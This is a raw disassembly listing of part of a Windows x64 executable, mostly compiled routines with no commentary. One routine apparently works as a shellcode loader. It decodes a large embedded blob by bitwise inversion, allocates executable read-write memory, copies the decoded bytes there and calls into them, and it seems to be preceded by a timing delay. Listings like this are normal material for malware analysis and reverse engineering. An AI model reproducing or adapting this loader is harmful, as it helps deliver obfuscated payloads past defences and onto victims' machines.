   1400016fd:	41 c1 e0 12          	shl    $0x12,%r8d
   140001701:	41 c1 e1 06          	shl    $0x6,%r9d
   140001705:	83 e2 3f             	and    $0x3f,%edx
   140001708:	44 09 ca             	or     %r9d,%edx
   14000170b:	44 09 c2             	or     %r8d,%edx
   14000170e:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   140001714:	0f 84 96 03 00 00    	je     0x140001ab0
   14000171a:	48 83 c1 04          	add    $0x4,%rcx
   14000171e:	eb 83                	jmp    0x1400016a3
   140001720:	48 83 c1 02          	add    $0x2,%rcx
   140001724:	41 c1 e0 06          	shl    $0x6,%r8d
   140001728:	45 09 d8             	or     %r11d,%r8d
   14000172b:	44 89 c2             	mov    %r8d,%edx
   14000172e:	e9 70 ff ff ff       	jmp    0x1400016a3
   140001733:	48 83 c1 03          	add    $0x3,%rcx
   140001737:	41 c1 e0 0c          	shl    $0xc,%r8d
   14000173b:	45 09 c1             	or     %r8d,%r9d
   14000173e:	44 89 ca             	mov    %r9d,%edx
   140001741:	e9 5d ff ff ff       	jmp    0x1400016a3
   140001746:	48 8d 05 03 af 01 00 	lea    0x1af03(%rip),%rax        # 0x14001c650
   14000174d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001751:	48 c7 45 f8 01 00 00 	movq   $0x1,-0x8(%rbp)
   140001758:	00 
   140001759:	48 c7 45 00 08 00 00 	movq   $0x8,0x0(%rbp)
   140001760:	00 
   140001761:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001764:	0f 11 45 08          	movups %xmm0,0x8(%rbp)
   140001768:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000176c:	e8 af 4c 00 00       	call   0x140006420
   140001771:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   140001775:	48 8d 04 55 00 00 00 	lea    0x0(,%rdx,2),%rax
   14000177c:	00 
   14000177d:	48 85 c0             	test   %rax,%rax
   140001780:	0f 85 75 01 00 00    	jne    0x1400018fb
   140001786:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   14000178a:	48 85 d2             	test   %rdx,%rdx
   14000178d:	74 0f                	je     0x14000179e
   14000178f:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   140001793:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001799:	e8 32 06 00 00       	call   0x140001dd0
   14000179e:	e8 dd 70 00 00       	call   0x140008880
   1400017a3:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   1400017a7:	89 55 c8             	mov    %edx,-0x38(%rbp)
   1400017aa:	48 8d 75 c0          	lea    -0x40(%rbp),%rsi
   1400017ae:	f3 0f 10 35 f2 ab 01 	movss  0x1abf2(%rip),%xmm6        # 0x14001c3a8
   1400017b5:	00 
   1400017b6:	f3 0f 10 3d ee ab 01 	movss  0x1abee(%rip),%xmm7        # 0x14001c3ac
   1400017bd:	00 
   1400017be:	eb 1f                	jmp    0x1400017df
   1400017c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017c3:	f3 48 0f 2a c0       	cvtsi2ss %rax,%xmm0
   1400017c8:	89 d0                	mov    %edx,%eax
   1400017ca:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400017cd:	f3 48 0f 2a c8       	cvtsi2ss %rax,%xmm1
   1400017d2:	f3 0f 5e ce          	divss  %xmm6,%xmm1
   1400017d6:	f3 0f 58 c8          	addss  %xmm0,%xmm1
   1400017da:	0f 2e f9             	ucomiss %xmm1,%xmm7
   1400017dd:	76 27                	jbe    0x140001806
   1400017df:	48 89 f1             	mov    %rsi,%rcx
   1400017e2:	e8 b9 73 00 00       	call   0x140008ba0
   1400017e7:	48 85 c0             	test   %rax,%rax
   1400017ea:	79 d4                	jns    0x1400017c0
   1400017ec:	48 89 c1             	mov    %rax,%rcx
   1400017ef:	48 d1 e9             	shr    $1,%rcx
   1400017f2:	83 e0 01             	and    $0x1,%eax
   1400017f5:	48 09 c8             	or     %rcx,%rax
   1400017f8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017fb:	f3 48 0f 2a c0       	cvtsi2ss %rax,%xmm0
   140001800:	f3 0f 58 c0          	addss  %xmm0,%xmm0
   140001804:	eb c2                	jmp    0x1400017c8
   140001806:	48 8d 05 8b ae 01 00 	lea    0x1ae8b(%rip),%rax        # 0x14001c698
   14000180d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001811:	48 c7 45 f8 01 00 00 	movq   $0x1,-0x8(%rbp)
   140001818:	00 
   140001819:	48 c7 45 00 08 00 00 	movq   $0x8,0x0(%rbp)
   140001820:	00 
   140001821:	0f 57 f6             	xorps  %xmm6,%xmm6
   140001824:	0f 11 75 08          	movups %xmm6,0x8(%rbp)
   140001828:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000182c:	e8 ef 4b 00 00       	call   0x140006420
   140001831:	48 8d 05 30 af 01 00 	lea    0x1af30(%rip),%rax        # 0x14001c768
   140001838:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000183c:	48 c7 45 f8 01 00 00 	movq   $0x1,-0x8(%rbp)
   140001843:	00 
   140001844:	48 c7 45 00 08 00 00 	movq   $0x8,0x0(%rbp)
   14000184b:	00 
   14000184c:	0f 11 75 08          	movups %xmm6,0x8(%rbp)
   140001850:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001854:	e8 c7 4b 00 00       	call   0x140006420
   140001859:	48 8d 15 18 af 01 00 	lea    0x1af18(%rip),%rdx        # 0x14001c778
   140001860:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001864:	41 b8 78 5c 05 00    	mov    $0x55c78,%r8d
   14000186a:	e8 81 60 01 00       	call   0x1400178f0
   14000186f:	83 7d f0 01          	cmpl   $0x1,-0x10(%rbp)
   140001873:	0f 84 b4 02 00 00    	je     0x140001b2d
   140001879:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   14000187d:	4c 8b 45 00          	mov    0x0(%rbp),%r8
   140001881:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001885:	e8 36 06 00 00       	call   0x140001ec0
   14000188a:	4c 8b 75 f0          	mov    -0x10(%rbp),%r14
   14000188e:	4c 89 f0             	mov    %r14,%rax
   140001891:	48 f7 d8             	neg    %rax
   140001894:	0f 80 c3 02 00 00    	jo     0x140001b5d
   14000189a:	4c 8b 7d f8          	mov    -0x8(%rbp),%r15
   14000189e:	48 8b 7d 00          	mov    0x0(%rbp),%rdi
   1400018a2:	48 85 ff             	test   %rdi,%rdi
   1400018a5:	0f 88 e2 02 00 00    	js     0x140001b8d
   1400018ab:	74 44                	je     0x1400018f1
   1400018ad:	0f b6 05 3d a8 07 00 	movzbl 0x7a83d(%rip),%eax        # 0x14007c0f1
   1400018b4:	be 01 00 00 00       	mov    $0x1,%esi
   1400018b9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400018be:	48 89 f9             	mov    %rdi,%rcx
   1400018c1:	e8 fa 04 00 00       	call   0x140001dc0
   1400018c6:	48 85 c0             	test   %rax,%rax
   1400018c9:	0f 84 c0 02 00 00    	je     0x140001b8f
   1400018cf:	48 89 c3             	mov    %rax,%rbx
   1400018d2:	48 83 ff 08          	cmp    $0x8,%rdi
   1400018d6:	0f 92 c0             	setb   %al
   1400018d9:	48 89 d9             	mov    %rbx,%rcx
   1400018dc:	4c 29 f9             	sub    %r15,%rcx
   1400018df:	48 83 f9 20          	cmp    $0x20,%rcx
   1400018e3:	0f 92 c1             	setb   %cl
   1400018e6:	08 c1                	or     %al,%cl
   1400018e8:	74 32                	je     0x14000191c
   1400018ea:	31 c0                	xor    %eax,%eax
   1400018ec:	e9 b8 00 00 00       	jmp    0x1400019a9
   1400018f1:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400018f6:	e9 1c 01 00 00       	jmp    0x140001a17
   1400018fb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001901:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140001905:	e8 c6 04 00 00       	call   0x140001dd0
   14000190a:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   14000190e:	48 85 d2             	test   %rdx,%rdx
   140001911:	0f 85 78 fe ff ff    	jne    0x14000178f
   140001917:	e9 82 fe ff ff       	jmp    0x14000179e
   14000191c:	48 83 ff 20          	cmp    $0x20,%rdi
   140001920:	73 04                	jae    0x140001926
   140001922:	31 c0                	xor    %eax,%eax
   140001924:	eb 52                	jmp    0x140001978
   140001926:	48 b8 e0 ff ff ff ff 	movabs $0x7fffffffffffffe0,%rax
   14000192d:	ff ff 7f 
   140001930:	48 21 f8             	and    %rdi,%rax
   140001933:	31 c9                	xor    %ecx,%ecx
   140001935:	66 0f 76 c0          	pcmpeqd %xmm0,%xmm0
   140001939:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001940:	f3 41 0f 6f 0c 0f    	movdqu (%r15,%rcx,1),%xmm1
   140001946:	f3 41 0f 6f 54 0f 10 	movdqu 0x10(%r15,%rcx,1),%xmm2
   14000194d:	66 0f ef c8          	pxor   %xmm0,%xmm1
   140001951:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140001955:	f3 0f 7f 0c 0b       	movdqu %xmm1,(%rbx,%rcx,1)
   14000195a:	f3 0f 7f 54 0b 10    	movdqu %xmm2,0x10(%rbx,%rcx,1)
   140001960:	48 83 c1 20          	add    $0x20,%rcx
   140001964:	48 39 c8             	cmp    %rcx,%rax
   140001967:	75 d7                	jne    0x140001940
   140001969:	48 39 c7             	cmp    %rax,%rdi
   14000196c:	0f 84 a5 00 00 00    	je     0x140001a17
   140001972:	40 f6 c7 18          	test   $0x18,%dil
   140001976:	74 31                	je     0x1400019a9
   140001978:	48 89 c1             	mov    %rax,%rcx
   14000197b:	48 b8 f8 ff ff ff ff 	movabs $0x7ffffffffffffff8,%rax
   140001982:	ff ff 7f 
   140001985:	48 21 f8             	and    %rdi,%rax
   140001988:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000198f:	00 
   140001990:	49 8b 14 0f          	mov    (%r15,%rcx,1),%rdx
   140001994:	48 f7 d2             	not    %rdx
   140001997:	48 89 14 0b          	mov    %rdx,(%rbx,%rcx,1)
   14000199b:	48 83 c1 08          	add    $0x8,%rcx
   14000199f:	48 39 c8             	cmp    %rcx,%rax
   1400019a2:	75 ec                	jne    0x140001990
   1400019a4:	48 39 c7             	cmp    %rax,%rdi
   1400019a7:	74 6e                	je     0x140001a17
   1400019a9:	48 89 fa             	mov    %rdi,%rdx
   1400019ac:	48 89 c1             	mov    %rax,%rcx
   1400019af:	48 83 e2 03          	and    $0x3,%rdx
   1400019b3:	74 1f                	je     0x1400019d4
   1400019b5:	48 89 c1             	mov    %rax,%rcx
   1400019b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400019bf:	00 
   1400019c0:	45 0f b6 04 0f       	movzbl (%r15,%rcx,1),%r8d
   1400019c5:	41 f6 d0             	not    %r8b
   1400019c8:	44 88 04 0b          	mov    %r8b,(%rbx,%rcx,1)
   1400019cc:	48 ff c1             	inc    %rcx
   1400019cf:	48 ff ca             	dec    %rdx
   1400019d2:	75 ec                	jne    0x1400019c0
   1400019d4:	48 29 f8             	sub    %rdi,%rax
   1400019d7:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
   1400019db:	77 3a                	ja     0x140001a17
   1400019dd:	0f 1f 00             	nopl   (%rax)
   1400019e0:	41 0f b6 04 0f       	movzbl (%r15,%rcx,1),%eax
   1400019e5:	f6 d0                	not    %al
   1400019e7:	88 04 0b             	mov    %al,(%rbx,%rcx,1)
   1400019ea:	41 0f b6 44 0f 01    	movzbl 0x1(%r15,%rcx,1),%eax
   1400019f0:	f6 d0                	not    %al
   1400019f2:	88 44 0b 01          	mov    %al,0x1(%rbx,%rcx,1)
   1400019f6:	41 0f b6 44 0f 02    	movzbl 0x2(%r15,%rcx,1),%eax
   1400019fc:	f6 d0                	not    %al
   1400019fe:	88 44 0b 02          	mov    %al,0x2(%rbx,%rcx,1)
   140001a02:	41 0f b6 44 0f 03    	movzbl 0x3(%r15,%rcx,1),%eax
   140001a08:	f6 d0                	not    %al
   140001a0a:	88 44 0b 03          	mov    %al,0x3(%rbx,%rcx,1)
   140001a0e:	48 83 c1 04          	add    $0x4,%rcx
   140001a12:	48 39 cf             	cmp    %rcx,%rdi
   140001a15:	75 c9                	jne    0x1400019e0
   140001a17:	4d 85 f6             	test   %r14,%r14
   140001a1a:	74 11                	je     0x140001a2d
   140001a1c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a22:	4c 89 f9             	mov    %r15,%rcx
   140001a25:	4c 89 f2             	mov    %r14,%rdx
   140001a28:	e8 a3 03 00 00       	call   0x140001dd0
   140001a2d:	31 c9                	xor    %ecx,%ecx
   140001a2f:	48 89 fa             	mov    %rdi,%rdx
   140001a32:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001a38:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140001a3e:	e8 6d 83 01 00       	call   0x140019db0
   140001a43:	48 85 c0             	test   %rax,%rax
   140001a46:	74 49                	je     0x140001a91
   140001a48:	48 89 c1             	mov    %rax,%rcx
   140001a4b:	48 89 da             	mov    %rbx,%rdx
   140001a4e:	49 89 f8             	mov    %rdi,%r8
   140001a51:	48 89 c6             	mov    %rax,%rsi
   140001a54:	e8 32 8e 01 00       	call   0x14001a88b
   140001a59:	0f ae f0             	mfence
   140001a5c:	ff d6                	call   *%rsi
   140001a5e:	31 f6                	xor    %esi,%esi
   140001a60:	48 85 ff             	test   %rdi,%rdi
   140001a63:	74 11                	je     0x140001a76
   140001a65:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a6b:	48 89 d9             	mov    %rbx,%rcx
   140001a6e:	48 89 fa             	mov    %rdi,%rdx
   140001a71:	e8 5a 03 00 00       	call   0x140001dd0
   140001a76:	48 89 f0             	mov    %rsi,%rax
   140001a79:	0f 28 75 30          	movaps 0x30(%rbp),%xmm6
   140001a7d:	0f 28 7d 40          	movaps 0x40(%rbp),%xmm7
   140001a81:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
   140001a88:	5b                   	pop    %rbx
   140001a89:	5f                   	pop    %rdi
   140001a8a:	5e                   	pop    %rsi
   140001a8b:	41 5e                	pop    %r14
   140001a8d:	41 5f                	pop    %r15
   140001a8f:	5d                   	pop    %rbp
   140001a90:	c3                   	ret
   140001a91:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140001a95:	48 89 7d 20          	mov    %rdi,0x20(%rbp)
   140001a99:	e8 a2 f7 ff ff       	call   0x140001240
   140001a9e:	48 89 c6             	mov    %rax,%rsi
   140001aa1:	48 8b 7d 20          	mov    0x20(%rbp),%rdi
   140001aa5:	48 85 ff             	test   %rdi,%rdi
   140001aa8:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   140001aac:	75 b7                	jne    0x140001a65
   140001aae:	eb c6                	jmp    0x140001a76
   140001ab0:	48 8d 05 51 ab 01 00 	lea    0x1ab51(%rip),%rax        # 0x14001c608
   140001ab7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001abb:	48 c7 45 f8 01 00 00 	movq   $0x1,-0x8(%rbp)
   140001ac2:	00 
   140001ac3:	48 c7 45 00 08 00 00 	movq   $0x8,0x0(%rbp)
   140001aca:	00 
   140001acb:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001ace:	0f 11 45 08          	movups %xmm0,0x8(%rbp)
   140001ad2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001ad6:	e8 45 49 00 00       	call   0x140006420
   140001adb:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001ae0:	e8 0b 6b 00 00       	call   0x1400085f0
   140001ae5:	e9 b8 00 00 00       	jmp    0x140001ba2
   140001aea:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140001aee:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140001af2:	48 8d 05 a7 aa 01 00 	lea    0x1aaa7(%rip),%rax        # 0x14001c5a0
   140001af9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001afe:	48 8d 0d 58 aa 01 00 	lea    0x1aa58(%rip),%rcx        # 0x14001c55d
   140001b05:	4c 8d 0d 8c a9 01 00 	lea    0x1a98c(%rip),%r9        # 0x14001c498
   140001b0c:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   140001b10:	ba 21 00 00 00       	mov    $0x21,%edx
   140001b15:	e8 46 9f 01 00       	call   0x14001ba60
   140001b1a:	e9 83 00 00 00       	jmp    0x140001ba2
   140001b1f:	48 8d 0d 92 aa 01 00 	lea    0x1aa92(%rip),%rcx        # 0x14001c5b8
   140001b26:	e8 c5 9b 01 00       	call   0x14001b6f0
   140001b2b:	eb 75                	jmp    0x140001ba2
   140001b2d:	0f 10 45 f8          	movups -0x8(%rbp),%xmm0
   140001b31:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140001b35:	48 8d 05 9c ab 01 00 	lea    0x1ab9c(%rip),%rax        # 0x14001c6d8
   140001b3c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b41:	48 8d 0d 60 ab 01 00 	lea    0x1ab60(%rip),%rcx        # 0x14001c6a8
   140001b48:	4c 8d 0d 29 a9 01 00 	lea    0x1a929(%rip),%r9        # 0x14001c478
   140001b4f:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   140001b53:	ba 21 00 00 00       	mov    $0x21,%edx
   140001b58:	e8 03 9f 01 00       	call   0x14001ba60
   140001b5d:	0f b7 45 f8          	movzwl -0x8(%rbp),%eax
   140001b61:	66 89 45 c0          	mov    %ax,-0x40(%rbp)
   140001b65:	48 8d 05 9c ab 01 00 	lea    0x1ab9c(%rip),%rax        # 0x14001c708
   140001b6c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b71:	48 8d 0d 78 ab 01 00 	lea    0x1ab78(%rip),%rcx        # 0x14001c6f0
   140001b78:	4c 8d 0d d9 a8 01 00 	lea    0x1a8d9(%rip),%r9        # 0x14001c458
   140001b7f:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   140001b83:	ba 13 00 00 00       	mov    $0x13,%edx
   140001b88:	e8 d3 9e 01 00       	call   0x14001ba60
   140001b8d:	31 f6                	xor    %esi,%esi
   140001b8f:	4c 89 7d e8          	mov    %r15,-0x18(%rbp)
   140001b93:	4c 89 75 20          	mov    %r14,0x20(%rbp)
   140001b97:	48 89 f1             	mov    %rsi,%rcx
   140001b9a:	48 89 fa             	mov    %rdi,%rdx
   140001b9d:	e8 a3 9a 01 00       	call   0x14001b645
   140001ba2:	0f 0b                	ud2
   140001ba4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001bab:	00 00 00 00 00 
   140001bb0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001bb5:	55                   	push   %rbp
   140001bb6:	41 57                	push   %r15
   140001bb8:	41 56                	push   %r14
   140001bba:	56                   	push   %rsi
   140001bbb:	57                   	push   %rdi
   140001bbc:	53                   	push   %rbx
   140001bbd:	48 83 ec 48          	sub    $0x48,%rsp
   140001bc1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001bc8:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
   140001bcd:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
   140001bd2:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   140001bd6:	48 85 d2             	test   %rdx,%rdx
   140001bd9:	74 0f                	je     0x140001bea
   140001bdb:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   140001bdf:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001be5:	e8 e6 01 00 00       	call   0x140001dd0
   140001bea:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
   140001bef:	0f 28 7c 24 20       	movaps 0x20(%rsp),%xmm7
   140001bf4:	48 83 c4 48          	add    $0x48,%rsp
   140001bf8:	5b                   	pop    %rbx
   140001bf9:	5f                   	pop    %rdi
   140001bfa:	5e                   	pop    %rsi
   140001bfb:	41 5e                	pop    %r14
   140001bfd:	41 5f                	pop    %r15
   140001bff:	5d                   	pop    %rbp
   140001c00:	c3                   	ret
   140001c01:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001c08:	0f 1f 84 00 00 00 00 
   140001c0f:	00 
   140001c10:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001c15:	55                   	push   %rbp
   140001c16:	41 57                	push   %r15
   140001c18:	41 56                	push   %r14
   140001c1a:	56                   	push   %rsi
   140001c1b:	57                   	push   %rdi
   140001c1c:	53                   	push   %rbx
   140001c1d:	48 83 ec 48          	sub    $0x48,%rsp
   140001c21:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001c28:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
   140001c2d:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
   140001c32:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   140001c36:	48 8d 04 55 00 00 00 	lea    0x0(,%rdx,2),%rax
   140001c3d:	00 
   140001c3e:	48 85 c0             	test   %rax,%rax
   140001c41:	74 0f                	je     0x140001c52
   140001c43:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001c49:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140001c4d:	e8 7e 01 00 00       	call   0x140001dd0
   140001c52:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
   140001c57:	0f 28 7c 24 20       	movaps 0x20(%rsp),%xmm7
   140001c5c:	48 83 c4 48          	add    $0x48,%rsp
   140001c60:	5b                   	pop    %rbx
   140001c61:	5f                   	pop    %rdi
   140001c62:	5e                   	pop    %rsi
   140001c63:	41 5e                	pop    %r14
   140001c65:	41 5f                	pop    %r15
   140001c67:	5d                   	pop    %rbp
   140001c68:	c3                   	ret
   140001c69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001c70:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001c75:	55                   	push   %rbp
   140001c76:	41 57                	push   %r15
   140001c78:	41 56                	push   %r14
   140001c7a:	56                   	push   %rsi
   140001c7b:	57                   	push   %rdi
   140001c7c:	53                   	push   %rbx
   140001c7d:	48 83 ec 48          	sub    $0x48,%rsp
   140001c81:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001c88:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
   140001c8d:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
   140001c92:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140001c97:	74 13                	je     0x140001cac
   140001c99:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001c9f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001ca3:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001ca7:	e8 24 01 00 00       	call   0x140001dd0
   140001cac:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
   140001cb1:	0f 28 7c 24 20       	movaps 0x20(%rsp),%xmm7
   140001cb6:	48 83 c4 48          	add    $0x48,%rsp
   140001cba:	5b                   	pop    %rbx
   140001cbb:	5f                   	pop    %rdi
   140001cbc:	5e                   	pop    %rsi
   140001cbd:	41 5e                	pop    %r14
   140001cbf:	41 5f                	pop    %r15
   140001cc1:	5d                   	pop    %rbp
   140001cc2:	c3                   	ret
   140001cc3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001cca:	84 00 00 00 00 00 
   140001cd0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001cd5:	55                   	push   %rbp
   140001cd6:	41 57                	push   %r15
   140001cd8:	41 56                	push   %r14
   140001cda:	56                   	push   %rsi
   140001cdb:	57                   	push   %rdi
   140001cdc:	53                   	push   %rbx
   140001cdd:	48 83 ec 48          	sub    $0x48,%rsp
   140001ce1:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001ce8:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
   140001ced:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
   140001cf2:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140001cf7:	74 13                	je     0x140001d0c
   140001cf9:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001cff:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001d03:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001d07:	e8 c4 00 00 00       	call   0x140001dd0
   140001d0c:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
   140001d11:	0f 28 7c 24 20       	movaps 0x20(%rsp),%xmm7
   140001d16:	48 83 c4 48          	add    $0x48,%rsp
   140001d1a:	5b                   	pop    %rbx
   140001d1b:	5f                   	pop    %rdi
   140001d1c:	5e                   	pop    %rsi
   140001d1d:	41 5e                	pop    %r14
   140001d1f:	41 5f                	pop    %r15
   140001d21:	5d                   	pop    %rbp
   140001d22:	c3                   	ret
   140001d23:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001d2a:	84 00 00 00 00 00 
   140001d30:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001d35:	55                   	push   %rbp
   140001d36:	41 57                	push   %r15
   140001d38:	41 56                	push   %r14
   140001d3a:	56                   	push   %rsi
   140001d3b:	57                   	push   %rdi
   140001d3c:	53                   	push   %rbx
   140001d3d:	48 83 ec 48          	sub    $0x48,%rsp
   140001d41:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001d48:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
   140001d4d:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
   140001d52:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001d56:	e8 c5 f6 ff ff       	call   0x140001420
   140001d5b:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
   140001d60:	0f 28 7c 24 20       	movaps 0x20(%rsp),%xmm7
   140001d65:	48 83 c4 48          	add    $0x48,%rsp
   140001d69:	5b                   	pop    %rbx
   140001d6a:	5f                   	pop    %rdi
   140001d6b:	5e                   	pop    %rsi
   140001d6c:	41 5e                	pop    %r14
   140001d6e:	41 5f                	pop    %r15
   140001d70:	5d                   	pop    %rbp
   140001d71:	c3                   	ret
   140001d72:	cc                   	int3
   140001d73:	cc                   	int3
   140001d74:	cc                   	int3
   140001d75:	cc                   	int3
   140001d76:	cc                   	int3
   140001d77:	cc                   	int3
   140001d78:	cc                   	int3
   140001d79:	cc                   	int3
   140001d7a:	cc                   	int3
   140001d7b:	cc                   	int3
   140001d7c:	cc                   	int3
   140001d7d:	cc                   	int3
   140001d7e:	cc                   	int3
   140001d7f:	cc                   	int3
   140001d80:	48 83 ec 38          	sub    $0x38,%rsp
   140001d84:	49 89 d1             	mov    %rdx,%r9
   140001d87:	4c 63 c1             	movslq %ecx,%r8
   140001d8a:	48 8d 05 7f f8 ff ff 	lea    -0x781(%rip),%rax        # 0x140001610
   140001d91:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001d96:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   140001d9b:	48 8d 15 86 a6 01 00 	lea    0x1a686(%rip),%rdx        # 0x14001c428
   140001da2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001da7:	e8 34 24 00 00       	call   0x1400041e0
   140001dac:	90                   	nop
   140001dad:	48 83 c4 38          	add    $0x38,%rsp
   140001db1:	c3                   	ret
   140001db2:	cc                   	int3
   140001db3:	cc                   	int3
   140001db4:	cc                   	int3
   140001db5:	cc                   	int3
   140001db6:	cc                   	int3
   140001db7:	cc                   	int3
   140001db8:	cc                   	int3
   140001db9:	cc                   	int3
   140001dba:	cc                   	int3
   140001dbb:	cc                   	int3
   140001dbc:	cc                   	int3
   140001dbd:	cc                   	int3
   140001dbe:	cc                   	int3
   140001dbf:	cc                   	int3
   140001dc0:	e9 eb 7e 00 00       	jmp    0x140009cb0
   140001dc5:	cc                   	int3
   140001dc6:	cc                   	int3
   140001dc7:	cc                   	int3
   140001dc8:	cc                   	int3
   140001dc9:	cc                   	int3
   140001dca:	cc                   	int3
   140001dcb:	cc                   	int3
   140001dcc:	cc                   	int3
   140001dcd:	cc                   	int3
   140001dce:	cc                   	int3
   140001dcf:	cc                   	int3
   140001dd0:	e9 3b 7f 00 00       	jmp    0x140009d10
   140001dd5:	cc                   	int3
   140001dd6:	cc                   	int3
   140001dd7:	cc                   	int3
   140001dd8:	cc                   	int3
   140001dd9:	cc                   	int3
   140001dda:	cc                   	int3
   140001ddb:	cc                   	int3
   140001ddc:	cc                   	int3
   140001ddd:	cc                   	int3
   140001dde:	cc                   	int3
   140001ddf:	cc                   	int3
   140001de0:	e9 5b 7f 00 00       	jmp    0x140009d40
   140001de5:	cc                   	int3
   140001de6:	cc                   	int3
   140001de7:	cc                   	int3
   140001de8:	cc                   	int3
   140001de9:	cc                   	int3
   140001dea:	cc                   	int3
   140001deb:	cc                   	int3
   140001dec:	cc                   	int3
   140001ded:	cc                   	int3
   140001dee:	cc                   	int3
   140001def:	cc                   	int3
   140001df0:	e9 6b b9 00 00       	jmp    0x14000d760
   140001df5:	cc                   	int3
   140001df6:	cc                   	int3
   140001df7:	cc                   	int3
   140001df8:	cc                   	int3
   140001df9:	cc                   	int3
   140001dfa:	cc                   	int3
   140001dfb:	cc                   	int3
   140001dfc:	cc                   	int3
